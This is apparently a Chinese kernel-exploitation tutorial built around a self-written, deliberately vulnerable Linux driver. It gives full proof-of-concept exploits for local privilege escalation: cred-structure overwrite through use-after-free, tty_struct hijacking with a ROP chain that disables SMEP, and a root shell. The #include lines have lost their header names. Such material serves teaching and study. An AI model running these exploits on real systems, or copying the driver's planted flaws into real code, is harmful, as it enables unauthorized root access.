> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270081.htm)

> [原创]Kernel 从 0 开始 (三)

前言
==

这里就尝试用堆来解题，由于 kernel 的解法多种多样，这里我们从最简单的 UAF 入手

 

给出自己设计的堆题目，存在很多的漏洞，read 越界读，edit 越界写，UAF，Double Free 等：

```
#include #include #include #include #include #include #include #include #include #include //设备驱动常用变量
//static char *buffer_var = NULL;
static char *buffer_var = NULL;
static struct class *devClass; // Global variable for the device class
static struct cdev cdev;
static dev_t stack_dev_no;
 
 
struct note
{
    int idx;
    int len;
    char* data;
};
 
 
//static char* notelist[1000];
static char* notelist[1000];
static struct note* noteChunk;
static int count = 0;
 
 
 
static ssize_t stack_read(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos);
 
static ssize_t stack_write(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos);
 
static long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
 
static int stack_open(struct inode *i, struct file *f);
 
static int stack_close(struct inode *i, struct file *f);
 
 
 
static struct file_operations stack_fops =
        {
                .owner = THIS_MODULE,
                .open = stack_open,
                .release = stack_close,
                .write = stack_write,
                .read = stack_read,
                .unlocked_ioctl = stack_ioctl
        };
 
// 设备驱动模块加载函数
static int __init stack_init(void)
{
    printk(KERN_INFO "[i] Module stack registered");
    if (alloc_chrdev_region(&stack_dev_no, 0, 1, "stack") < 0)
    {
        return -1;
    }
    if ((devClass = class_create(THIS_MODULE, "chardrv")) == NULL)
    {
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
    if (device_create(devClass, NULL, stack_dev_no, NULL, "stack") == NULL)
    {
        printk(KERN_INFO "[i] Module stack error");
        class_destroy(devClass);
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
    cdev_init(&cdev, &stack_fops);
    if (cdev_add(&cdev, stack_dev_no, 1) == -1)
    {
        device_destroy(devClass, stack_dev_no);
        class_destroy(devClass);
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
 
    printk(KERN_INFO "[i] : <%d, %d>\n", MAJOR(stack_dev_no), MINOR(stack_dev_no));
    return 0;
}
 
// 设备驱动模块卸载函数
static void __exit stack_exit(void)
{
    // 释放占用的设备号
    unregister_chrdev_region(stack_dev_no, 1);
    cdev_del(&cdev);
}
 
 
// 读设备
ssize_t stack_read(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos)
{
    printk(KERN_INFO "Stack_read function" );
    copy_to_user(buf,buffer_var,len);
}
 
// 写设备
ssize_t stack_write(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos)  //buffer overflow
{
    printk(KERN_INFO "Stack_write function" );
    copy_from_user(buffer_var, buf, len);
    printk("[i] Module stack write: %s\n",buffer_var);
    return len;
}
 
 
 
// ioctl函数命令控制
long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    char* chunk = NULL;
    int retval = 0;
    printk(KERN_INFO "Ioctl Get!\n");
    printk("notelist_addr:0x%llx\n",¬elist[0]);
    switch (cmd) {
 
        case 1://add
            //noteChunk = (char *)kmalloc(sizeof(struct Note),GFP_KERNEL);
            //copy_from_user(noteChunk, arg, sizeof(struct Note));
 
            printk("Kernel Add function!---001\n");
            noteChunk = (struct Note*)arg;
            chunk = (char *)kmalloc(noteChunk->len,GFP_KERNEL);
            printk("chunk_addr:0x%llx\n",chunk);
            if (!chunk)
            {
                printk("Alloca Error\n");
                return 0;
            }
            memcpy(chunk, noteChunk->data,noteChunk->len);
            notelist[count] = chunk;
            chunk = NULL;
            count ++;
            printk("Add Success!\n");
            break;
 
        case 888: //free without clean point and data
            printk("Kernel Free function!---888\n");
            noteChunk = (struct Note*)arg;
            printk("notelist:0x%llx\n",notelist[noteChunk->idx]);
            if (notelist[noteChunk->idx])
            {
                kfree(notelist[noteChunk->idx]);
                //notelist[noteChunk->idx] = NULL;
                printk("Free Success!\n");
            }
            else
            {
                printk("You can't free it!There is no chunk!\n");
            }
            break;
 
        case 3://edit   //UAF and overflow
            printk("Kernel Edit function!---003\n");
            noteChunk = (struct Note*)arg;
            if (notelist[noteChunk->idx])
            {
                memcpy(notelist[noteChunk->idx], noteChunk->data,noteChunk->len);
                printk("Edit Success!\n");
            }
            else
            {
                printk("You can't edit it!There is no chunk!\n");
            }
            break;
 
        case 4://read   //over read
            printk("Kernel Read function!---004\n");
            noteChunk = (struct Note*)arg;
            if(notelist[noteChunk->idx]){
                copy_to_user(noteChunk->data,notelist[noteChunk->idx],noteChunk->len);
                printk("Read Success!\n");
            }
            break;
 
        case 111: //Test add chunk
            printk("Test add chunk!---111\n");
            printk(KERN_INFO "No buffer_var!Malloc now!" );
            buffer_var=(char*)kmalloc(0xa8,GFP_KERNEL);
            printk("buffer_var:0x%llx\n",buffer_var);
            break;
 
        default:
            retval = -1;
            break;
    }   
 
    return retval;
}
 
 
static int stack_open(struct inode *i, struct file *f)
{
    printk(KERN_INFO "[i] Module stack: open()\n");
    return 0;
}
 
static int stack_close(struct inode *i, struct file *f)
{
    kfree(buffer_var);
    //buffer_var = NULL;
    printk(KERN_INFO "[i] Module stack: close()\n");
    return 0;
}
 
module_init(stack_init);
module_exit(stack_exit);
 
MODULE_LICENSE("GPL");
// MODULE_AUTHOR("blackndoor");
// MODULE_DESCRIPTION("Module vuln overflow"); 
```

[](#一、利用cred结构体提权)一、利用 Cred 结构体提权
=================================

1. 正常 UAF
---------

### 前置知识

由于是 UAF 漏洞，所以直接尝试再重启一个进程，这样新进程启动时就会申请一个 Cred 结构体 (这里大小为 0xa8)。而如果此时申请的结构体恰好落在我们释放过的堆块上，那么我们就可以利用 UAF 漏洞修改 Cred 结构体，将其 uid 和 gid 改为 0，再利用该进程原地起 shell，就能获得 root 权限的 shell 了。

 

这里同样需要一点前置知识，之前也写过类似的，其实就相当于修改某个进程的 cred 结构体中的 uid 和 gid 就能将该进程提权了，之后利用提权后的进程起 shell 得到的 shell 就是提权后的 shell。

 

比较简单，这里直接给

### POC

```
#include #include #include #include #include #include #include #include #include #include struct addNote
{
    size_t len;
    char* data;
};
 
struct editNote
{
    size_t idx;
    size_t len;
    char* data;
};
 
 
 
//open dev
int openDev(char* pos);
void addFun(int fd,struct addNote* arg);
void freeFun(int fd,struct editNote* arg);
void editFun(int fd,struct editNote* arg);
void readFun(int fd,struct editNote* arg);
 
 
int main(int argc, char *argv[])
{
    int fd;
    int idFork;
    unsigned long memOffset;
    struct addNote addChunk;
    struct editNote readChunk;
    struct editNote editChunk;
 
    //open Dev
    char* pos = "/dev/stack";
    fd = openDev(pos);
 
    char credBuf[0xa8] = {0};
    addChunk.len = 0xa8;
    addChunk.data = credBuf;
    addFun(fd,&addChunk);
 
    editChunk.idx = 0;
    freeFun(fd,&editChunk);
 
    idFork = fork();
    editChunk.data = credBuf;
    editChunk.len = 28;
    if(idFork == 0){
        //get into 28*0 to set uid and gid 0
        editFun(fd,&editChunk);    
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(idFork < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
 
    return 0;
 
}
 
 
int openDev(char* pos){
    int fd;
    printf("[+] Open %s...\n",pos);
    if ((fd = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return fd;
}
 
void addFun(int fd, struct addNote* arg)
{
    ioctl(fd,1,arg);
}
 
void freeFun(int fd, struct editNote* arg)
{
    ioctl(fd,888,arg);
}
 
void editFun(int fd, struct editNote* arg)
{
    ioctl(fd,3,arg);
}
 
void readFun(int fd, struct editNote* arg)
{
    ioctl(fd,4,arg);
} 
```

这里还需要说明的是，cred 结构体大小在我编译的 4.4.72 中为 0xa8，在不同内核版本可能不同，通常可以查看对应版本的 Linux 内核源码或者写个简便的 C 程序运行一下即可知道。

2. 伪条件竞争造成的 UAF(多进程)
--------------------

### 前置知识

前面我们的 UAF 是正常的指针未置空的 UAF，但如果在程序中是 add 函数申请 chunk，只有在关闭设备时才会释放 chunk。那么这样当我们对一个设备进行操作时，只有在关闭设备时才能释放 chunk，这就无法显著地造成 UAF。但是如果能够对同一个设备打开两次 (操作符分别为 fd1,fd2) ，申请一个堆块后，关闭掉第一个设备 fd1 后，就能释放该堆块。之后利用 fd2 继续对设备进行写操作，就能够继续修改释放掉的堆块了，这样就造成了一个 UAF 漏洞。同样也是利用 cred 结构体进行提权。

 

同样直接给出 poc 即可

### POC

```
#include #include #include #include #include #include #include #include #include #include struct addNote
{
    size_t len;
    char* data;
};
 
struct editNote
{
    size_t idx;
    size_t len;
    char* data;
};
 
 
 
//open dev
int openDev(char* pos);
void addFun(int fd,struct addNote* arg);
void freeFun(int fd,struct editNote* arg);
void editFun(int fd,struct editNote* arg);
void readFun(int fd,struct editNote* arg);
 
 
int main(int argc, char *argv[])
{
    int fd1,fd2;
    int idFork,idBefore;
    unsigned long memOffset;
    struct addNote addChunk;
    struct editNote readChunk;
    struct editNote editChunk;
    //char *mycred;
 
    //mycred = current_user_ns();
    //printf("Cred_addr:0x%llx\n",mycred);
 
    //open Dev
    char* pos = "/dev/stack";
    char credBuf[0xa8] = {0};
    fd1 = openDev(pos);
    fd2 = openDev(pos);
    ioctl(fd1,111,editChunk); //test add
    close(fd1);
 
    idFork = fork();
    printf("idFork:%d\n",idFork);
 
    if(idFork == 0){
        //get into 28*0 to set uid and gid 0
        idBefore = getuid();
        printf("Before uid:%d\n",idBefore);
        write(fd2, credBuf, 28);
 
        if(getuid() == 0){
            printf("[*]welcome root:\n");
            system("/bin/sh");
            return 0;
        }
    }
    else if(idFork < 0){
        printf("[*]fork fail\n");
    }
    else{
        wait(NULL);
    }
 
    return 0;
 
}
 
 
int openDev(char* pos){
    int fd;
    printf("[+] Open %s...\n",pos);
    if ((fd = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return fd;
}
 
void addFun(int fd, struct addNote* arg)
{
    ioctl(fd,1,arg);
}
 
void freeFun(int fd, struct editNote* arg)
{
    ioctl(fd,888,arg);
}
 
void editFun(int fd, struct editNote* arg)
{
    ioctl(fd,3,arg);
}
 
void readFun(int fd, struct editNote* arg)
{
    ioctl(fd,4,arg);
} 
```

[](#二、劫持tty_struct结构体)二、劫持 tty_struct 结构体
=========================================

这个真是调了我无敌久。

原理
--

### 1. 函数调用链

`entry_SYSCALL_64`->`SyS_write`->`SYSC_write`->`vfs_write`

 

->`__vfs_write`->`tty_write`->`do_tty_write`->`n_tty_write`->`pty_write`

 

这里我们需要的就是劫持某个结构体，从而使得原本通过该结构体调用`pty_write`函数指针变为调用我们的 ROP 链条。

### 2. 劫持栈

由于用户空间和内核空间得返回进入需要用到栈，所以一般需要进行栈劫持，这里我们可以看到当通过 ptmx 进入其 write 函数时，rax 为从 tty_struct 中获取的 operations _ops 指针，而此时该指针已经被我们劫持了，所以如果有类似于 mov rsp,rax 之类的 gadget 就能将栈劫持到我们可控的 operations_ ops 指针指向的内存处，那么之后就很容易进行内核和用户空间的转换。

 

这里就用到常用的一个 gadget

 

movRspRax_decEbx_ret

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211011000009.png)

### 3. 结构体

这个之前也是讲过的

```
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;
 
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
 
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox; /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp; /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize; /* winsize_mutex */
    unsigned long stopped:1, /* flow_lock */
        flow_stopped:1,
        unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8, /* ctrl_lock */
        packet:1,
        unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room; /* Bytes free for queue */
    int flow_change;
 
    struct tty_struct *link;
    struct fasync_struct *fasync;
    int alt_speed; /* For magic substitution of 38400 bps */
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    struct list_head tty_files;
 
#define N_TTY_BUF_SIZE 4096
 
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
};

```

当我们打开 ptmx 设备时，会使用 kmalloc 申请这个 tty_struct 结构，如果存在一个 UAF 漏洞，那么就可以将该 tty_struct 申请为我们释放掉的一个 chunk，其中重要的是 int magic; 和 const struct tty_operations *ops; 这两个结构体成员。

#### magic 成员

这个在网上很多人都直接将其设置为 0，但是在某些版本中，如果直接设置为 0，通常可能出现以下的错误：

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233212.png)

 

也就是 magic number 检测错误，这个经过调试可以发现，实际申请结构体之后是不变的：

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233737.png)

 

可以得到如下的数值

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010233844.png)

 

这个在后面的数值设置中可以用到，需要我们来调试才可以，不然其实如果直接设置为 0 也容易出错。

 

另外其中的 driver 可以设置为 0，所以一般直接设置 tty_struct[3] 和 tty_struct[0] 即可。

#### ops 成员

这个 const struct tty_operations *ops 结构体指针在该做法里被劫持为我们设置 fake_operations 指针，有如下结构体，设置 fake_operations 中的 write 函数指针为 ROP 链条，就可以通过调用 ptmx 设备中的 write 函数，从而调用到我们设置的 ROP 链条。

```
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
    struct inode *inode, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct * tty,
        const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
        unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
    struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

```

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010234216.png)

### 4. 最终结构

#### fake_tty_struct 结构体

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235018.png)

#### fake_tty_operation 结构体

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235328.png)

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211010235417.png)

POC
---

```
#include #include #include #include #include #include #include #include #include #include #include struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long user_sp;
 
#define tty_size 0x2e0
 
 
struct addNote
{
    size_t len;
    char* data;
};
 
struct editNote
{
    size_t idx;
    size_t len;
    char* data;
};
 
 
 
//ROP func
unsigned long findAddr();
void save_state();
void getroot (void);
void shell(void);
 
//open dev
int openDev(char* pos);
void addFun(int fd,struct addNote* arg);
void freeFun(int fd,struct editNote* arg);
void editFun(int fd,struct editNote* arg);
void readFun(int fd,struct editNote* arg);
 
 
int main(int argc, char *argv[])
{
    int fd,fd_tty;
    char buf[0x10];
    int i = 0;
    unsigned long memOffset;
    struct addNote addChunk;
    struct editNote readChunk;
    struct editNote editChunk;
 
    unsigned long smpOffset = 0x1146000;
    memOffset = findAddr();
 
    //debug kernel
    unsigned long vmBase = memOffset - smpOffset;
    unsigned long pop_rdi_ret = vmBase + 0x3d032d;
    unsigned long pop_rax_rbx_r12_r13_rbp_ret = vmBase + 0x46c45e;
    unsigned long movCr4Rdi_pop_rbp_ret = vmBase + 0x004c40;
    unsigned long movRspRax_decEbx_ret = vmBase + 0x805115;
    unsigned long swapgs_sysret = (unsigned long)vmBase + 0x60ba2;
    unsigned long swapgs_popRbp_ret = (unsigned long)vmBase + 0x60394;
    unsigned long iretq = (unsigned long)vmBase + 0x803857;
    unsigned long getR = (unsigned long)getroot;
    unsigned long sh = (unsigned long)shell;
    unsigned long sp;
    size_t rop[32];
 
    commit_creds        = (commit_creds_t)(vmBase + 0x9f4a0);
    prepare_kernel_cred = (prepare_kernel_cred_t)(vmBase + 0x9f870);
 
 
    // unsigned long vmBase = memOffset - smpOffset;
    // unsigned long pop_rdi_ret = vmBase + 0xFE3542;
 
    // unsigned long pop_rax_rbx_r12_rbp_ret = vmBase + 0x3794b9;
    // unsigned long movCr4Rax_pop_rbp_ret = vmBase + 0xe0e4;
    // unsigned long movRspRax_decEbx_ret = vmBase + 0x8841CF;
    // unsigned long getR = (unsigned long)getroot;
    // unsigned long swapgs_ret = (unsigned long)vmBase + 0x884188;
    // unsigned long iretq = (unsigned long)vmBase + 0x882d77;
    // unsigned long sh = (unsigned long)shell;
 
    //print part
    printf("pop_rdi_ret:0x%llx\n",pop_rdi_ret);
    printf("movCr4Rdi_pop_rbp_ret:0x%llx\n",movCr4Rdi_pop_rbp_ret);
    printf("movRspRax_decEbx_ret:0x%llx\n",movRspRax_decEbx_ret);
    printf("iretq:0x%llx\n",iretq);
 
    //open Dev
    char* pos = "/dev/stack";
    fd = openDev(pos);
    char ttyBuf[tty_size] = {'0'};
    addChunk.len = tty_size;
    addChunk.data = ttyBuf;
    addFun(fd,&addChunk);
 
 
    void* fake_tty_operations[30];
    for(int i = 0; i < 30; i++)
    {
        fake_tty_operations[i] = movRspRax_decEbx_ret;
    }
    fake_tty_operations[0] = pop_rax_rbx_r12_r13_rbp_ret;
    fake_tty_operations[1] = (size_t)rop;
 
    size_t fake_tty_struct[4] = {0};
    fake_tty_struct[0] = 0x0000000100005401;//need to set magic number
    fake_tty_struct[1] = 0;
    fake_tty_struct[2] = 0;
    fake_tty_struct[3] = (size_t)fake_tty_operations;
 
 
 
    editChunk.idx = 0;
    editChunk.len = 0x20;
    editChunk.data = fake_tty_struct;
 
    freeFun(fd,&editChunk);
 
    pos = "/dev/ptmx";
    fd_tty = openDev(pos);
    printf("fd_tty:0x%d\n",fd_tty);
    editFun(fd, &editChunk);
 
 
    //rop set
    save_state();
    rop[i++] = pop_rdi_ret;      // pop_rax_rbx_r12_rbp_ret
    rop[i++] = 0x6f0;
    rop[i++] = movCr4Rdi_pop_rbp_ret;      // mov cr4, rax; pop rbp; ret;
    rop[i++] = 0;
    rop[i++] = (size_t)getR;
    rop[i++] = swapgs_popRbp_ret;      // swapgs;ret
    rop[i++] = 0x0;
    rop[i++] = iretq;      // iretq
    rop[i++] = (size_t)sh;
    rop[i++] = user_cs;                /* saved CS */
    rop[i++] = user_rflags;            /* saved EFLAGS */
    rop[i++] = user_sp;
    rop[i++] = user_ss;
 
    write(fd_tty,buf,0x10);
 
    return 0;
 
}
 
 
int openDev(char* pos){
    int fd;
    printf("[+] Open %s...\n",pos);
    if ((fd = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return fd;
}
 
void addFun(int fd, struct addNote* arg)
{
    ioctl(fd,1,arg);
}
 
void freeFun(int fd, struct editNote* arg)
{
    ioctl(fd,888,arg);
}
 
void editFun(int fd, struct editNote* arg)
{
    ioctl(fd,3,arg);
}
 
void readFun(int fd, struct editNote* arg)
{
    ioctl(fd,4,arg);
}
 
 
void save_state() {
   __asm__("mov %cs,user_cs;"
           "mov %ss,user_ss;"
           "mov %rsp,user_sp;"
           "pushf;"
           "pop user_rflags;"
           );
  puts("user states have been saved!!");
}
 
 
void shell(void) {
  printf("[+] getuid() ...");
  if(!getuid()) {
    printf(" [root]\n[+] Enjoy your shell...\n");
    system("/bin/sh");
  } else {
    printf("[+] not root\n[+] failed !!!\n");
  }
}
 
/* function to get root id */
void getroot (void)
{
  commit_creds(prepare_kernel_cred(0));
}
 
unsigned long findAddr() {
 
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;
 
    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");
 
    printf("[+] Find usefull addr...\n");
    FILE* file = fopen("/tmp/dmesg", "r");
 
    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void **)&addr);
            break;
        }
    }
    fclose(file);
 
    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }
 
    return addr;
 
} 
```

执行流程
----

这里还得说一下执行流程，比较不好调试

 

即先是依据 write 函数跳转到我们最开始设置的 gadget，也就是 movRspRax_decEbx_ret，然后将栈劫持为 fake_tty_operations。之后再跳转到 pop_rax_rbx_r12_r13_rbp_ret，将 ROP 赋值给 rax，再 ret 到

 

movRspRax_decEbx_ret，再将栈劫持为 ROP，之后就 ret 到 ROP 链条中的 pop_rdi_ret 了，之后执行流可控。

[](#▲注意事项：)▲注意事项：
=================

swapgs;ret 没有时，可以用加上 pop 的，只要最后 ret 到 iretq 即可。同样的 gadget 可以相互转换。

 

iretq 类似于 ret，直接一个指令即可。

 

寄存器保存需要在进入内核之前。

 

堆块申请时的规则需要是`GFP_KERNEL`才行，至少`GFP_DMA`不行。

[第五届安全开发者峰会（SDC 2021）10 月 23 日上海召开！限时 2.5 折门票 (含自助午餐 1 份）](https://www.bagevent.com/event/6334937)